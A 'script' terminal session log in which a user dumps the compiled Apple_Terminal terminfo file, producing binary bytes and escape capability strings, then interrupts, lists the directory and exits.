+*   išnsterm|Apple_Terminal|AppKit Terminal.app                       P         ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ2   ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ      ÿÿ      ! % ) ÿÿ4 E G K R ÿÿT [ ÿÿ_ ÿÿc g k ÿÿq s x } ÿÿ† ‹  ÿÿ• š Ÿ ÿÿ¤ ¦ « ÿÿ¸ ½ Ã É ÿÿÛ ÿÿÿÿÿÿÿÿİ á ÿÿå ÿÿÿÿÿÿç ÿÿì ÿÿÿÿÿÿÿÿğ ô ú ş $ÿÿÿÿ(ÿÿ,16ÿÿÿÿÿÿ:>FÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿNW`iÿÿr{„ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ–ÿÿÿÿ²µÀÃÅÈ!ÿÿ$&ÿÿÿÿÿÿ+/37;ÿÿÿÿ?ÿÿrÿÿÿÿv|ÿÿÿÿ‚ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ‰ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ‘ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ˜ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿŸÿÿÿÿÿÿÿÿÿÿ¦¬²¸¾ÄÊĞÖÜÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿâÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿçò÷ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿZ  [%i%p1%d;%p2%dr [3g [H[J [K [J [%i%p1%dG [%i%p1%d;%p2%dH 
+ [H [?25l  [?25h [C [A [P [M ]2;  [5m [1m 7[?47h [2m [4h [8m [7m [7m [4m  [m [2J[?47l8 [4l [27m [24m [?5h$<200/>[?5l  [@ [L  [3~ OB OP [21~ OQ OR OS [15~ [17~ [18~ [19~ [20~ OH OD [6~ [5~ OC OA [?1l> [?1h= [%p1%dP [%p1%dM [%p1%dB [%p1%d@ [%p1%dL [%p1%dD [%p1%dC [%p1%dA >[?3l[?4l[?5l[?7h[?8h 8 [%i%p1%dd 7 
+ M [0%?%p6%t;1%;%?%p2%t;4%;%?%p1%p3%|%t;7%;%?%p4%t;5%;%?%p5%t;2%;%?%p7%t;8%;m%?%p9%t%e%; H 	 ]2; Oq Os Or Op On ``aaffggjjkkllmmnnooppqqrrssttuuvvwwxxyyzz{{||}}~~ [Z [?7h [?7l (B)0 OF OM [3;2~ [1;2D [1;2C [23~ [24~ [25~ [26~ [28~ [29~ [31~ [32~ [33~ [34~ [1K [%i%d;%dR [6n [?1;2c [c [39;49m [3m [23m [< [%?%p1%{8}%<%t3%p1%d%e%p1%{16}%<%t9%p1%{8}%-%d%e38;5;%p1%d%;m [%?%p1%{8}%<%t4%p1%d%e%p1%{16}%<%t10%p1%{8}%-%d%e48;5;%p1%d%;m   < | £   ÿÿÿÿÿÿÿÿÿÿÿÿÿÿ   ÿÿÿÿÿÿÿÿ% ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ, ÿÿ/ ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ6 ÿÿ9 ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ@     	        ! ' - 2 7 < A F J O T Y ^ c i o u {  ‡  “ ™ Ÿ ¥ « ° µ » Á Ç Í Ó Ù ß å ë ñ ÷ ı 	#(-159=]2; [?1006;1000%?%p1%{1}%=%th%el%; [3;5~ b [1;5D f [1;5C [<%p1%d;%p2%d;%p3%d;%?%p4%tM%em%; AX G0 XT U8 E0 E3 S0 Se Ss TS XM grbom gsbom kDC3 kDC4 kDC5 kDC6 kDC7 kDN kDN3 kDN4 kDN5 kDN6 kDN7 kEND3 kEND4 kEND5 kEND6 kEND7 kEND8 kHOM3 kHOM4 kHOM5 kHOM6 kHOM7 kHOM8 kIC5 kIC6 kLFT3 kLFT4 kLFT5 kLFT6 kLFT7 kNXT3 kNXT5 kNXT6 kPRV3 kPRV5 kPRV6 kRIT3 kRIT4 kRIT5 kRIT6 kRIT7 kUP kUP3 kUP4 kUP5 kUP6 ka2 kb1 kb3 kc2 xm admin@ip-172-31-23-144:/usr/share/terminfo/A$ 9R1;2c^C
+admin@ip-172-31-23-144:/usr/share/terminfo/A$ ^C
+admin@ip-172-31-23-144:/usr/share/terminfo/A$ ^C
+admin@ip-172-31-23-144:/usr/share/terminfo/A$ ^C
+admin@ip-172-31-23-144:/usr/share/terminfo/A$ ^C
+admin@ip-172-31-23-144:/usr/share/terminfo/A$ ^C
+admin@ip-172-31-23-144:/usr/share/terminfo/A$ ls
+Apple_Terminal
+admin@ip-172-31-23-144:/usr/share/terminfo/A$ exit
+exit
+
+Script done on 2020-06-05 12:55:14+02:00
